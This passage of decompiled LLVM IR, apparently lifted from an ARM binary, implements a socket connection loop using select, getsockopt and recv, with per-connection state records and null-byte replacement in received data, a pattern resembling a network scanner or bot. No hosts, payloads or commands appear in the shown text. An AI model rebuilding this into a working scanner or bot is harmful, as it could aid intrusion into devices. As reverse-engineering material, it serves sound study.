  %v7_10518 = icmp eq i32 %v3_10514, 1
  store i1 %v7_10518, i1* %cpsr_z.global-to-local, align 1
  %v2_1051c = xor i1 %v7_10518, true
  %v3_1051c = and i1 %v2_10518, %v2_1051c
  br i1 %v3_1051c, label %dec_label_pc_10494, label %dec_label_pc_10524

dec_label_pc_10524:                               ; preds = %dec_label_pc_104fc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10524 = icmp eq i32 %v3_10514, 0
  store i1 %v2_10524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10524, label %bb337, label %dec_label_pc_10494

dec_label_pc_10534:                               ; preds = %dec_label_pc_fc84
  store i32 ptrtoint (i32* @global_var_1a734.199 to i32), i32* %r2.global-to-local, align 4
  %v2_10538 = load i32, i32* @global_var_1a734.199, align 4
  store i32 %v2_10538, i32* %r0.global-to-local, align 4
  %v1_1053c = call i32 @close(i32 %v2_10538)
  store i32 %v1_1053c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10444

dec_label_pc_10544:                               ; preds = %dec_label_pc_104ac
  store i32 %v3_10544, i32* %r0.global-to-local, align 4
  %v3_1054c = udiv i32 %v3_10544, 32
  %v3_10550 = mul nuw nsw i32 %v3_1054c, 4
  store i32 %v2_10554, i32* %lr.global-to-local, align 4
  %v2_10558 = add i32 %v3_10550, %v2_10554
  store i32 %v2_10558, i32* %r3.global-to-local, align 4
  %v1_1055c = add i32 %v2_10558, -312
  %v2_1055c = inttoptr i32 %v1_1055c to i32*
  %v3_1055c = load i32, i32* %v2_1055c, align 4
  %v1_10560 = urem i32 %v3_10544, 32
  store i32 %v1_10560, i32* %r1.global-to-local, align 4
  %v7_10564 = shl i32 1, %v1_10560
  %v8_10564 = or i32 %v3_1055c, %v7_10564
  store i32 %v8_10564, i32* %r2.global-to-local, align 4
  %v0_10568 = load i32, i32* @r5, align 4
  %v3_10568 = icmp uge i32 %v0_10568, %v3_10544
  store i1 %v3_10568, i1* %cpsr_c.global-to-local, align 1
  %v9_10568 = icmp eq i32 %v0_10568, %v3_10544
  store i1 %v9_10568, i1* %cpsr_z.global-to-local, align 1
  %v5_1056c = icmp slt i32 %v0_10568, %v3_10544
  br i1 %v5_1056c, label %bb338, label %bb339

bb338:                                            ; preds = %dec_label_pc_10544
  store i32 %v3_10544, i32* @r5, align 4
  br label %bb339

bb339:                                            ; preds = %dec_label_pc_10544, %bb338
  store i32 %v8_10564, i32* %v2_1055c, align 4
  br label %bb337

dec_label_pc_10578:                               ; preds = %dec_label_pc_10494
  %v1_10578 = add i32 %v2_10510, 4
  %v2_10578 = inttoptr i32 %v1_10578 to i32*
  %v3_10578 = load i32, i32* %v2_10578, align 4
  store i32 %v3_10578, i32* %r0.global-to-local, align 4
  %v1_1057c = call i32 @close(i32 %v3_10578)
  store i32 %v1_1057c, i32* %r0.global-to-local, align 4
  %v0_10580 = load i32, i32* @r4, align 4
  %v1_10580 = add i32 %v0_10580, 12
  %v2_10580 = inttoptr i32 %v1_10580 to i32*
  %v3_10580 = load i32, i32* %v2_10580, align 4
  store i32 %v3_10580, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10588 = icmp ugt i32 %v3_10580, 1
  store i1 %v2_10588, i1* %cpsr_c.global-to-local, align 1
  %v7_10588 = icmp eq i32 %v3_10580, 2
  store i1 %v7_10588, i1* %cpsr_z.global-to-local, align 1
  %v2_1058c = add i32 %v0_10580, 4
  %v3_1058c = inttoptr i32 %v2_1058c to i32*
  store i32 -1, i32* %v3_1058c, align 4
  %v2_10590 = xor i1 %v2_10588, true
  %v3_10590 = or i1 %v7_10588, %v2_10590
  br i1 %v3_10590, label %dec_label_pc_105b8, label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_10578
  %v0_10594 = load i32, i32* @r4, align 4
  %v1_10594 = add i32 %v0_10594, 284
  %v2_10594 = inttoptr i32 %v1_10594 to i8*
  %v3_10594 = load i8, i8* %v2_10594, align 1
  %v4_10594 = zext i8 %v3_10594 to i32
  %v1_10598 = add nuw nsw i32 %v4_10594, 1
  %v1_1059c = urem i32 %v1_10598, 256
  store i32 %v1_1059c, i32* %r3.global-to-local, align 4
  %v2_105a0 = icmp ugt i32 %v1_1059c, 9
  store i1 %v2_105a0, i1* %cpsr_c.global-to-local, align 1
  %v7_105a0 = icmp eq i32 %v1_1059c, 10
  store i1 %v7_105a0, i1* %cpsr_z.global-to-local, align 1
  %v1_105a4 = trunc i32 %v1_10598 to i8
  store i8 %v1_105a4, i8* %v2_10594, align 1
  %v0_105a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_105a8, label %dec_label_pc_105b8, label %dec_label_pc_105ac

dec_label_pc_105ac:                               ; preds = %dec_label_pc_10594
  %v0_105ac = load i32, i32* @r4, align 4
  store i32 %v0_105ac, i32* @r0, align 4
  %v0_105b0 = call i32 @function_f928()
  store i32 %v0_105b0, i32* %r0.global-to-local, align 4
  br label %bb337

dec_label_pc_105b8:                               ; preds = %dec_label_pc_10594, %dec_label_pc_10578
  %v0_105b8 = load i32, i32* @r7, align 4
  %v1_105b8 = load i32, i32* @r4, align 4
  %v2_105b8 = add i32 %v1_105b8, 12
  %v3_105b8 = inttoptr i32 %v2_105b8 to i32*
  store i32 %v0_105b8, i32* %v3_105b8, align 4
  %v0_105bc = load i32, i32* @r7, align 4
  %v1_105bc = trunc i32 %v0_105bc to i8
  %v2_105bc = load i32, i32* @r4, align 4
  %v3_105bc = add i32 %v2_105bc, 284
  %v4_105bc = inttoptr i32 %v3_105bc to i8*
  store i8 %v1_105bc, i8* %v4_105bc, align 1
  br label %bb337

dec_label_pc_105c4:                               ; preds = %bb337
  store i32 1, i32* %stack_var_-64, align 4
  %v0_105cc = load i32, i32* @r6, align 4
  %v1_105cc = load i32, i32* @r5, align 4
  %v3_105cc = icmp uge i32 %v0_105cc, %v1_105cc
  store i1 %v3_105cc, i1* %cpsr_c.global-to-local, align 1
  %v9_105cc = icmp eq i32 %v0_105cc, %v1_105cc
  store i1 %v9_105cc, i1* %cpsr_z.global-to-local, align 1
  %v5_105d0 = icmp slt i32 %v0_105cc, %v1_105cc
  %storemerge108 = select i1 %v5_105d0, i32 %v1_105cc, i32 %v0_105cc
  store i32 %v2_105dc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_105e4, i32* %ip.global-to-local, align 4
  store i32 %v2_105e8, i32* %r1.global-to-local, align 4
  %v1_105ec = add i32 %storemerge108, 1
  store i32 %v1_105ec, i32* %r0.global-to-local, align 4
  %v13_105f8 = call i32 @select(i32 %v1_105ec, %_TYPEDEF_fd_set* %tmp341, %_TYPEDEF_fd_set* %tmp340, %_TYPEDEF_fd_set* null, %timeval* %tmp343)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10600 = call i32 @time(i32* null)
  store i32 ptrtoint (i32* @global_var_1a710.184 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_10600, i32* @global_var_1a710.184, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_10658

dec_label_pc_1061c:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_111d8
  %v0_10634 = phi i32 [ %v3_10670, %dec_label_pc_1067c ], [ %v0_1061c.pre, %dec_label_pc_111d8 ]
  %v3_1061c = udiv i32 %v0_10634, 32
  %v3_10624 = mul nuw nsw i32 %v3_1061c, 4
  store i32 %v2_10554, i32* %lr.global-to-local, align 4
  %v2_1062c = add i32 %v3_10624, %v2_10554
  store i32 %v2_1062c, i32* %r3.global-to-local, align 4
  %v1_10630 = add i32 %v2_1062c, -184
  %v2_10630 = inttoptr i32 %v1_10630 to i32*
  %v3_10630 = load i32, i32* %v2_10630, align 4
  %v1_10634 = urem i32 %v0_10634, 32
  store i32 %v1_10634, i32* %r1.global-to-local, align 4
  %v2_10638 = add nsw i32 %v1_10634, -1
  %v3_10638 = shl i32 1, %v2_10638
  %v4_10638 = and i32 %v3_10638, %v3_10630
  %v5_10638 = icmp ne i32 %v4_10638, 0
  store i1 %v5_10638, i1* %cpsr_c.global-to-local, align 1
  %v6_10638 = lshr i32 %v3_10630, %v1_10634
  store i32 %v6_10638, i32* %r2.global-to-local, align 4
  %v1_1063c = urem i32 %v6_10638, 2
  %v2_1063c = icmp eq i32 %v1_1063c, 0
  store i1 %v2_1063c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1063c, label %dec_label_pc_10644, label %dec_label_pc_1080c.preheader

dec_label_pc_1080c.preheader:                     ; preds = %dec_label_pc_1061c
  %v0_1080c129 = load i32, i32* @r6, align 4
  %v1_1080c130 = add i32 %v0_1080c129, 12
  %v2_1080c131 = inttoptr i32 %v1_1080c130 to i32*
  %v3_1080c132 = load i32, i32* %v2_1080c131, align 4
  store i32 %v3_1080c132, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10810128134 = icmp eq i32 %v3_1080c132, 0
  store i1 %v2_10810128134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10810128134, label %dec_label_pc_10644, label %dec_label_pc_10818.lr.ph

dec_label_pc_10644:                               ; preds = %dec_label_pc_1080c.loopexit, %dec_label_pc_10810.backedge, %dec_label_pc_1080c.preheader, %dec_label_pc_1061c, %.thread241, %dec_label_pc_11108, %dec_label_pc_10658, %dec_label_pc_111ec, %dec_label_pc_11148
  %v3_10644 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10644, i32* %r3.global-to-local, align 4
  %v1_10648 = add i32 %v3_10644, 1
  store i32 %v1_10648, i32* %r2.global-to-local, align 4
  %v2_1064c = icmp ugt i32 %v1_10648, 254
  store i1 %v2_1064c, i1* %cpsr_c.global-to-local, align 1
  %v7_1064c = icmp eq i32 %v1_10648, 255
  store i1 %v7_1064c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10648, i32* %stack_var_-52, align 4
  %v8_10654 = icmp sgt i32 %v1_10648, 255
  br i1 %v8_10654, label %dec_label_pc_fec4, label %dec_label_pc_10658

dec_label_pc_10658:                               ; preds = %dec_label_pc_10644, %dec_label_pc_105c4
  %v0_10664 = phi i32 [ %v1_10648, %dec_label_pc_10644 ], [ 0, %dec_label_pc_105c4 ]
  store i32 ptrtoint (i32* @global_var_1a730.197 to i32), i32* %ip.global-to-local, align 4
  %v3_1065c = mul i32 %v0_10664, 256
  store i32 %v3_1065c, i32* %r3.global-to-local, align 4
  %v2_10660 = load i32, i32* @global_var_1a730.197, align 4
  store i32 %v2_10660, i32* %r1.global-to-local, align 4
  %v2_10668 = mul i32 %v0_10664, 288
  store i32 %v2_10668, i32* %r2.global-to-local, align 4
  %v2_1066c = add i32 %v2_10660, %v2_10668
  store i32 %v2_1066c, i32* @r6, align 4
  %v1_10670 = add i32 %v2_1066c, 4
  %v2_10670 = inttoptr i32 %v1_10670 to i32*
  %v3_10670 = load i32, i32* %v2_10670, align 4
  store i32 %v3_10670, i32* %r4.global-to-local, align 4
  %v2_10674 = icmp eq i32 %v3_10670, -1
  store i1 %v2_10674, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10674, label %dec_label_pc_10644, label %dec_label_pc_1067c

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10658
  %v3_1067c = udiv i32 %v3_10670, 32
  %v3_10684 = mul nuw nsw i32 %v3_1067c, 4
  store i32 %v2_10554, i32* %lr.global-to-local, align 4
  %v2_1068c = add i32 %v3_10684, %v2_10554
  store i32 %v2_1068c, i32* %r3.global-to-local, align 4
  %v1_10690 = add i32 %v2_1068c, -312
  %v2_10690 = inttoptr i32 %v1_10690 to i32*
  %v3_10690 = load i32, i32* %v2_10690, align 4
  %v1_10694 = urem i32 %v3_10670, 32
  store i32 %v1_10694, i32* %r1.global-to-local, align 4
  %v2_10698 = add nsw i32 %v1_10694, -1
  %v3_10698 = shl i32 1, %v2_10698
  %v4_10698 = and i32 %v3_10690, %v3_10698
  %v5_10698 = icmp ne i32 %v4_10698, 0
  store i1 %v5_10698, i1* %cpsr_c.global-to-local, align 1
  %v6_10698 = lshr i32 %v3_10690, %v1_10694
  store i32 %v6_10698, i32* %r2.global-to-local, align 4
  %v1_1069c = urem i32 %v6_10698, 2
  %v2_1069c = icmp eq i32 %v1_1069c, 0
  store i1 %v2_1069c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1069c, label %dec_label_pc_1061c, label %dec_label_pc_106a4

dec_label_pc_106a4:                               ; preds = %dec_label_pc_1067c
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_10c78, i32* %r3.global-to-local, align 4
  store i32 %v2_10780, i32* %ip.global-to-local, align 4
  store i32 %v3_10670, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v8_106d4 = call i32 @getsockopt(i32 %v3_10670, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-56)
  %v3_106d8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_106d8, i32* %r3.global-to-local, align 4
  %v2_106dc = or i32 %v3_106d8, %v8_106d4
  store i32 %v2_106dc, i32* %r0.global-to-local, align 4
  %v4_106dc = icmp eq i32 %v2_106dc, 0
  store i1 %v4_106dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_106dc, label %dec_label_pc_106e4, label %dec_label_pc_111ec

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106a4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_106e8 = load i32, i32* @r6, align 4
  %v2_106e8 = add i32 %v1_106e8, 12
  %v3_106e8 = inttoptr i32 %v2_106e8 to i32*
  store i32 2, i32* %v3_106e8, align 4
  %v0_106ec = call i32 @function_f6c4()
  %v3_106f4 = load i8, i8* @global_var_1a70d.191, align 1
  %v4_106f4 = zext i8 %v3_106f4 to i32
  store i32 %v4_106f4, i32* %r2.global-to-local, align 4
  %v2_106f8 = load i8, i8* bitcast (i8** @global_var_1a70c.190 to i8*), align 4
  %v3_106f8 = zext i8 %v2_106f8 to i32
  %v4_106fc = mul nuw nsw i32 %v4_106f4, 256
  %v5_106fc = or i32 %v3_106f8, %v4_106fc
  store i32 %v5_106fc, i32* %r1.global-to-local, align 4
  %v2_10700 = urem i32 %v0_106ec, %v5_106fc
  store i32 ptrtoint (i32* @global_var_1a6dc.186 to i32), i32* %r3.global-to-local, align 4
  %v2_10708 = load i32, i32* @global_var_1a6dc.186, align 4
  store i32 %v2_10708, i32* %lr.global-to-local, align 4
  %v1_10710 = load i32, i32* @r5, align 4
  %v9_10710 = icmp eq i32 %v2_10708, %v1_10710
  store i1 %v9_10710, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v2_10700, i32* %r0.global-to-local, align 4
  %v7_10718 = icmp sgt i32 %v2_10708, %v1_10710
  br i1 %v7_10718, label %dec_label_pc_1071c, label %dec_label_pc_111d4

dec_label_pc_1071c:                               ; preds = %dec_label_pc_106e4
  %v2_10720 = load i32, i32* @global_var_1a708.188, align 4
  store i32 %v2_10720, i32* %r3.global-to-local, align 4
  store i32 %v1_10710, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1073c

dec_label_pc_1072c:                               ; preds = %dec_label_pc_10754, %dec_label_pc_1073c
  %v1_1072c = add i32 %v0_1072c, 1
  store i32 %v1_1072c, i32* %ip.global-to-local, align 4
  %v3_10730 = icmp uge i32 %v1_1072c, %v2_10708
  store i1 %v3_10730, i1* %cpsr_c.global-to-local, align 1
  %v9_10730 = icmp eq i32 %v1_1072c, %v2_10708
  store i1 %v9_10730, i1* %cpsr_z.global-to-local, align 1
  %v1_10734 = add i32 %v0_10734, 16
  store i32 %v1_10734, i32* %r3.global-to-local, align 4
  br i1 %v9_10730, label %dec_label_pc_111d4, label %dec_label_pc_1073c

dec_label_pc_1073c:                               ; preds = %dec_label_pc_1072c, %dec_label_pc_1071c
  %v0_1072c = phi i32 [ %v1_1072c, %dec_label_pc_1072c ], [ %v1_10710, %dec_label_pc_1071c ]
  %v0_10734 = phi i32 [ %v1_10734, %dec_label_pc_1072c ], [ %v2_10720, %dec_label_pc_1071c ]
  store i32 %v0_10734, i32* %r1.global-to-local, align 4
  %v1_10740 = add i32 %v0_10734, 9
  %v2_10740 = inttoptr i32 %v1_10740 to i8*
  %v3_10740 = load i8, i8* %v2_10740, align 1
  %v4_10740 = zext i8 %v3_10740 to i32
  store i32 %v4_10740, i32* %r2.global-to-local, align 4
  %v1_10744 = add i32 %v0_10734, 8
  %v2_10744 = inttoptr i32 %v1_10744 to i8*
  %v3_10744 = load i8, i8* %v2_10744, align 1
  %v4_10744 = zext i8 %v3_10744 to i32
  %v4_10748 = mul nuw nsw i32 %v4_10740, 256
  %v5_10748 = or i32 %v4_10744, %v4_10748
  store i32 %v5_10748, i32* %r3.global-to-local, align 4
  %v3_1074c = icmp uge i32 %v5_10748, %v2_10700
  store i1 %v3_1074c, i1* %cpsr_c.global-to-local, align 1
  %v9_1074c = icmp eq i32 %v5_10748, %v2_10700
  store i1 %v9_1074c, i1* %cpsr_z.global-to-local, align 1
  %v2_10750 = xor i1 %v9_1074c, true
  %v3_10750 = and i1 %v3_1074c, %v2_10750
  br i1 %v3_10750, label %dec_label_pc_1072c, label %dec_label_pc_10754

dec_label_pc_10754:                               ; preds = %dec_label_pc_1073c
  %v1_10754 = add i32 %v0_10734, 10
  %v2_10754 = inttoptr i32 %v1_10754 to i8*
  %v3_10754 = load i8, i8* %v2_10754, align 1
  %v4_10754 = zext i8 %v3_10754 to i32
  store i32 %v4_10754, i32* %r3.global-to-local, align 4
  %v1_10758 = add i32 %v0_10734, 11
  %v2_10758 = inttoptr i32 %v1_10758 to i8*
  %v3_10758 = load i8, i8* %v2_10758, align 1
  %v4_10758 = zext i8 %v3_10758 to i32
  store i32 %v4_10758, i32* %r2.global-to-local, align 4
  %v4_1075c = mul nuw nsw i32 %v4_10758, 256
  %v5_1075c = or i32 %v4_1075c, %v4_10754
  store i32 %v5_1075c, i32* %r3.global-to-local, align 4
  %v3_10760 = icmp uge i32 %v5_1075c, %v2_10700
  store i1 %v3_10760, i1* %cpsr_c.global-to-local, align 1
  %v9_10760 = icmp eq i32 %v5_1075c, %v2_10700
  store i1 %v9_10760, i1* %cpsr_z.global-to-local, align 1
  %v2_10764 = xor i1 %v3_10760, true
  %v3_10764 = or i1 %v9_10760, %v2_10764
  br i1 %v3_10764, label %dec_label_pc_1072c, label %dec_label_pc_111d8

dec_label_pc_1076c:                               ; preds = %dec_label_pc_109d4, %dec_label_pc_109a8, %dec_label_pc_109f0
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_10770 = call i32 @function_11394(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10778 = call i32 @function_11394(i32 30)
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_10788 = call i32 @function_112b0(i32 29, i32* nonnull %stack_var_-56)
  store i32 %v3_10788, i32* @r4, align 4
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_1079c = call i32 @function_112b0(i32 30, i32* nonnull %stack_var_-56)
  %v3_107a0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1079c, i32* @r5, align 4
  %v0_107a8 = load i32, i32* @r4, align 4
  store i32 %v0_107a8, i32* %r2.global-to-local, align 4
  %v1_107ac = add i32 %v3_107a0, -1
  store i32 %v1_107ac, i32* %r3.global-to-local, align 4
  %v0_107b0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_107b0, i32* %r0.global-to-local, align 4
  %v0_107b4 = load i32, i32* @r6, align 4
  %v1_107b4 = add i32 %v0_107b4, 24
  %v2_107b4 = inttoptr i32 %v1_107b4 to i32*
  %v3_107b4 = load i32, i32* %v2_107b4, align 4
  store i32 %v3_107b4, i32* %r1.global-to-local, align 4
  %v4_107b8 = call i32 @function_11aa0(i32 %v0_107b0, i32 %v3_107b4, i32 %v0_107a8, i32 %v1_107ac)
  store i32 %v4_107b8, i32* %r0.global-to-local, align 4
  %v2_107bc = icmp eq i32 %v4_107b8, -1
  store i1 %v2_107bc, i1* %cpsr_c.global-to-local, align 1
  %v7_107bc = icmp eq i32 %v4_107b8, -1
  store i1 %v7_107bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107bc, label %dec_label_pc_107cc, label %dec_label_pc_107f4

dec_label_pc_107cc:                               ; preds = %dec_label_pc_1076c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_107cc = load i32, i32* %stack_var_-56, align 4
  %v0_107d0 = load i32, i32* @r5, align 4
  store i32 %v0_107d0, i32* %r2.global-to-local, align 4
  %v1_107d4 = add i32 %v3_107cc, -1
  store i32 %v1_107d4, i32* %r3.global-to-local, align 4
  %v0_107d8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_107d8, i32* %r0.global-to-local, align 4
  %v0_107dc = load i32, i32* @r6, align 4
  %v1_107dc = add i32 %v0_107dc, 24
  %v2_107dc = inttoptr i32 %v1_107dc to i32*
  %v3_107dc = load i32, i32* %v2_107dc, align 4
  store i32 %v3_107dc, i32* %r1.global-to-local, align 4
  %v4_107e0 = call i32 @function_11aa0(i32 %v0_107d8, i32 %v3_107dc, i32 %v0_107d0, i32 %v1_107d4)
  store i32 %v4_107e0, i32* %r0.global-to-local, align 4
  %v2_107e4 = icmp eq i32 %v4_107e0, -1
  store i1 %v2_107e4, i1* %cpsr_c.global-to-local, align 1
  %v7_107e4 = icmp eq i32 %v4_107e0, -1
  store i1 %v7_107e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107e4, label %dec_label_pc_11208, label %dec_label_pc_107f4

dec_label_pc_107f4:                               ; preds = %dec_label_pc_107cc, %dec_label_pc_1076c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_107f8 = call i32 @function_112dc(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10800 = call i32 @function_112dc(i32 30)
  store i32 %v1_10800, i32* %r0.global-to-local, align 4
  %v0_10804 = load i32, i32* @r7, align 4
  %v3_10804 = icmp eq i32 %v0_10804, -1
  store i1 %v3_10804, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10804, label %dec_label_pc_1080c.loopexit, label %dec_label_pc_10a0c

dec_label_pc_1080c.loopexit:                      ; preds = %dec_label_pc_10998.thread, %dec_label_pc_10998, %dec_label_pc_11044, %dec_label_pc_1088c, %dec_label_pc_107f4, %dec_label_pc_11030
  %v0_1080c = load i32, i32* @r6, align 4
  %v1_1080c = add i32 %v0_1080c, 12
  %v2_1080c = inttoptr i32 %v1_1080c to i32*
  %v3_1080c = load i32, i32* %v2_1080c, align 4
  store i32 %v3_1080c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10810128 = icmp eq i32 %v3_1080c, 0
  store i1 %v2_10810128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10810128, label %dec_label_pc_10644, label %dec_label_pc_10818.lr.ph

dec_label_pc_10818.lr.ph:                         ; preds = %dec_label_pc_1080c.preheader, %dec_label_pc_1080c.loopexit
  %v0_10818161 = phi i32 [ %v0_1080c, %dec_label_pc_1080c.loopexit ], [ %v0_1080c129, %dec_label_pc_1080c.preheader ]
  br label %dec_label_pc_10818

dec_label_pc_10818:                               ; preds = %dec_label_pc_10810.backedge.thread, %dec_label_pc_10810.backedge, %dec_label_pc_10810.backedge.thread501, %dec_label_pc_10818.lr.ph
  %v0_11180 = phi i32 [ %v0_10818161, %dec_label_pc_10818.lr.ph ], [ %v0_10818158, %dec_label_pc_10810.backedge ], [ %v0_1088c, %dec_label_pc_10810.backedge.thread ], [ %v0_1088c, %dec_label_pc_10810.backedge.thread501 ]
  %v1_10818 = add i32 %v0_11180, 24
  %v2_10818 = inttoptr i32 %v1_10818 to i32*
  %v3_10818 = load i32, i32* %v2_10818, align 4
  store i32 %v3_10818, i32* %r3.global-to-local, align 4
  %v2_1081c = icmp ugt i32 %v3_10818, 255
  store i1 %v2_1081c, i1* %cpsr_c.global-to-local, align 1
  %v7_1081c = icmp eq i32 %v3_10818, 256
  store i1 %v7_1081c, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_11180, 28
  store i32 %.pre, i32* %r8.global-to-local, align 4
  br i1 %v7_1081c, label %dec_label_pc_11180, label %dec_label_pc_10828

dec_label_pc_10828:                               ; preds = %dec_label_pc_10818, %dec_label_pc_11180
  store i32 0, i32* @r5, align 4
  %v1_1082c = load i32, i32* @sb, align 4
  %v2_1082c = inttoptr i32 %v1_1082c to i32*
  store i32 0, i32* %v2_1082c, align 4
  %v0_10830 = load i32, i32* @r6, align 4
  %v1_10830 = add i32 %v0_10830, 24
  %v2_10830 = inttoptr i32 %v1_10830 to i32*
  %v3_10830 = load i32, i32* %v2_10830, align 4
  store i32 %v3_10830, i32* %r2.global-to-local, align 4
  %v0_10834 = load i32, i32* %r8.global-to-local, align 4
  %v2_10834 = add i32 %v0_10834, %v3_10830
  store i32 %v2_10834, i32* @r4, align 4
  %v1_10838 = add i32 %v0_10830, 4
  %v2_10838 = inttoptr i32 %v1_10838 to i32*
  %v3_10838 = load i32, i32* %v2_10838, align 4
  store i32 %v3_10838, i32* %r0.global-to-local, align 4
  %v1_1083c = sub i32 256, %v3_10830
  store i32 %v1_1083c, i32* %r2.global-to-local, align 4
  store i32 %v2_10834, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10848 = inttoptr i32 %v2_10834 to i32*
  %v5_10848 = call i32 @recv(i32 %v3_10838, i32* %v4_10848, i32 %v1_1083c, i32 16384)
  store i32 %v5_10848, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1084c = icmp eq i32 %v5_10848, 0
  store i1 %v2_1084c, i1* %cpsr_z.global-to-local, align 1
  %tmp345 = icmp slt i32 %v5_10848, 1
  br i1 %tmp345, label %dec_label_pc_110fc, label %dec_label_pc_10854

dec_label_pc_10854:                               ; preds = %dec_label_pc_10828
  %v0_10854 = load i32, i32* @r5, align 4
  store i32 %v0_10854, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1085c

dec_label_pc_1085c:                               ; preds = %bb347, %dec_label_pc_10854
  %v3_10864 = phi i32 [ %v1_10868, %bb347 ], [ %v0_10854, %dec_label_pc_10854 ]
  %v1_1085c = load i32, i32* @r4, align 4
  %v2_1085c = add i32 %v1_1085c, %v3_10864
  %v3_1085c = inttoptr i32 %v2_1085c to i8*
  %v4_1085c = load i8, i8* %v3_1085c, align 1
  %v6_1085c = zext i8 %v4_1085c to i32
  store i32 %v6_1085c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10860 = icmp eq i8 %v4_1085c, 0
  store i1 %v2_10860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10860, label %bb346, label %bb347

bb346:                                            ; preds = %dec_label_pc_1085c
  %v1_10864 = load i32, i32* %r1.global-to-local, align 4
  %v2_10864 = trunc i32 %v1_10864 to i8
  store i8 %v2_10864, i8* %v3_1085c, align 1
  %v0_10868.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb347

bb347:                                            ; preds = %dec_label_pc_1085c, %bb346
  %v0_10868 = phi i32 [ %v3_10864, %dec_label_pc_1085c ], [ %v0_10868.pre, %bb346 ]
  %v1_10868 = add i32 %v0_10868, 1
  store i32 %v1_10868, i32* %r2.global-to-local, align 4
  %v3_1086c = icmp uge i32 %v5_10848, %v1_10868
  store i1 %v3_1086c, i1* %cpsr_c.global-to-local, align 1
  %v9_1086c = icmp eq i32 %v5_10848, %v1_10868
  store i1 %v9_1086c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1086c, label %dec_label_pc_10874, label %dec_label_pc_1085c

dec_label_pc_10874:                               ; preds = %bb347, %dec_label_pc_11100
  store i32 ptrtoint (i32* @global_var_1a710.184 to i32), i32* %r1.global-to-local, align 4
  %v0_10878 = load i32, i32* @r6, align 4
  %v1_10878 = add i32 %v0_10878, 24
  %v2_10878 = inttoptr i32 %v1_10878 to i32*
  %v3_10878 = load i32, i32* %v2_10878, align 4
  %v2_1087c = load i32, i32* @global_var_1a710.184, align 4
  store i32 %v2_1087c, i32* %r3.global-to-local, align 4
  %v2_10880 = add i32 %v3_10878, %v5_10848
  store i32 %v2_10880, i32* %ip.global-to-local, align 4
  store i32 %v2_10880, i32* %v2_10878, align 4
  %v0_10888 = load i32, i32* %r3.global-to-local, align 4
  %v1_10888 = load i32, i32* @r6, align 4
  %v2_10888 = add i32 %v1_10888, 8
  %v3_10888 = inttoptr i32 %v2_10888 to i32*
  store i32 %v0_10888, i32* %v3_10888, align 4
  br label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_10d48, %dec_label_pc_10874
  %v0_1088c = load i32, i32* @r6, align 4
  %v1_1088c = add i32 %v0_1088c, 12
